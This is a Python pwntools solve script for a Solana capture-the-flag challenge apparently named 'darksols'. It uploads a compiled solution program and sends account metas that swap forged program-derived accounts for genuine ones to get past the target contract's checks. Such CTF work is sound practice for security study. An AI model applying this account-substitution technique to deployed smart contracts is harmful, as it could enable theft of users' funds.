#!/usr/bin/python3

from pwn import *
from base58 import b58decode, b58encode
from solana_helpers import find_program_address
import os

if os.system('cd ./solution && make build'):
    print('[x] Build solution program failed.')
    exit(1)

# io = remote('darksols.nc.jctf.pro', 1337)
io = remote('localhost', 8080)

with open('./solution/dist/solution.so','rb') as f:
    content = f.read()
io.sendlineafter(b'\n',str(len(content)).encode())
io.send(content)

def get_account():
    io.recvuntil(b': ')
    return io.recvline().rstrip().decode()

def pda(base_key, seed):
    acc, acc_nonce = find_program_address([seed], b58decode(base_key))
    return b58encode(acc).decode(), acc_nonce

# get 10 accounts
program_pubkey       = get_account()
solve_pubkey         = get_account()
evil_contract_pubkey = get_account()
item_mint_pubkey     = get_account()
item_pubkey          = get_account()
item1337_mint_pubkey = get_account()
item1337_pubkey      = get_account()
token_pubkey         = get_account()
user_pubkey          = get_account()
rent_pubkey          = get_account()

# program PDAs
player, playernonce = pda(program_pubkey,b'player')
vault , vaultnonce  = pda(program_pubkey,b'vault')
auth  , authnonce   = pda(program_pubkey,b'authority')
sanity, sanitynonce = pda(program_pubkey,b'sanity')
weapon, weaponnonce = pda(program_pubkey,b'weapon')
ptokn1, ptokn1nonce = pda(program_pubkey,b'token')
ptokn2, ptokn2nonce = pda(program_pubkey,b'13337')

# solve PDAs
fakeitem, fakeitemnonce     = pda(solve_pubkey,b'1')
fake1337item, fake1337itemnonce = pda(solve_pubkey,b'2')
fakeweapon, fakeweaponnonce = pda(solve_pubkey,b'3')
fakesanity, fakesanitynonce = pda(solve_pubkey,b'4')
fakeplayer, fakeplayernonce = pda(solve_pubkey,b'5')
fakeptokn1, fakeptokn1nonce = pda(solve_pubkey,b'6')
fakeptokn2, fakeptokn2nonce = pda(solve_pubkey,b'7')

# metas
io.sendline(b"25")
io.sendline(b"r SysvarC1ock11111111111111111111111111111111")
io.sendline(b"r 11111111111111111111111111111111")
io.sendline(f"r {token_pubkey}".encode())
io.sendline(f"w {item_mint_pubkey}".encode())
io.sendline(f"w {ptokn1}".encode())
io.sendline(f"w {item1337_mint_pubkey}".encode())
io.sendline(f"w {ptokn2}".encode())
io.sendline(f"w {auth}".encode())
io.sendline(f"ws {user_pubkey}".encode())
io.sendline(f"r {sanity}".encode())
io.sendline(f"r {rent_pubkey}".encode())
io.sendline(f"w {player}".encode())
io.sendline(f"w {vault}".encode())
io.sendline(f"r {program_pubkey}".encode())
io.sendline(f"r {weapon}".encode())
io.sendline(f"w {item_pubkey}".encode())
io.sendline(f"w {item1337_pubkey}".encode())
io.sendline(f"w {fakeitem}".encode())
io.sendline(f"w {fake1337item}".encode())
io.sendline(f"w {fakeweapon}".encode())
io.sendline(f"w {fakesanity}".encode())
io.sendline(f"r {evil_contract_pubkey}".encode())
io.sendline(f"w {fakeplayer}".encode())
io.sendline(f"w {fakeptokn1}".encode())
io.sendline(f"w {fakeptokn2}".encode())

# ix
buf  = p8(vaultnonce)
buf += p8(authnonce)
buf += p8(playernonce)
buf += p8(ptokn1nonce) 
buf += p8(ptokn2nonce)
buf += p8(fakeitemnonce)
buf += p8(fake1337itemnonce)
buf += p8(fakeweaponnonce)
buf += p8(fakeplayernonce)
buf += p8(fakeptokn1nonce)
buf += p8(fakeptokn2nonce)
buf += p8(fakesanitynonce)
buf += p8(sanitynonce)
buf += p8(weaponnonce)

io.sendline(str(len(buf)).encode())
io.send(buf)

print(io.recvall().decode())

